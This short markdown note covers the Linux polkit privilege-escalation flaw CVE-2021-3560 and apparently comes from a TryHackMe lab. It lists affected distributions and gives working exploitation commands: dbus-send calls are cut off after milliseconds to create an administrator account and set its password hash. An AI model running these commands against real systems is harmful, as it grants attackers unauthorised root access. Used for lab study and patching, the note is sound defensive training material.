# CVE-2021-3560

[Kevin Backhouse](https://github.blog/author/kevinbackhouse/) discovered a seven year old privilege escalation vulnerability (since designated CVE-2021-3560) in the Linux [polkit](https://gitlab.freedesktop.org/polkit/polkit/) utility. It is system service running whenever you see a GUI `Authentication Required` and is part of the Linux authorisation system.

```bash
pkexec # not sudo to interact with polkit
```

|Distribution|Vulnerable?|
|---|---|
|RHEL 7|No|
|RHEL 8|[Yes](https://access.redhat.com/security/cve/CVE-2021-3560)|
|Fedora 20 (or earlier)|No|
|Fedora 21 (or later)|[Yes](https://bugzilla.redhat.com/show_bug.cgi?id=1967424)|
|Debian 10 (“buster”)|No|
|Debian testing (“bullseye”)|[Yes](https://security-tracker.debian.org/tracker/CVE-2021-3560)|
|Ubuntu 18.04|No|
|Ubuntu 20.04|[Yes](https://ubuntu.com/security/CVE-2021-3560)|

Exploitation Steps:
```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/UserUSER_ID org.freedesktop.Accounts.User.SetPassword string:'PASSWORD_HASH' string:'Ask the pentester'


dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!

openssl passwd -6 Expl01ted

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
```

## References

[THM Polkit CVE-2021-3560](https://tryhackme.com/room/polkit)
[polkit](https://gitlab.freedesktop.org/polkit/polkit/)
[Kevin Backhouse](https://github.blog/author/kevinbackhouse/)
[Github.Blog - Kevin Backhouse Blog](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)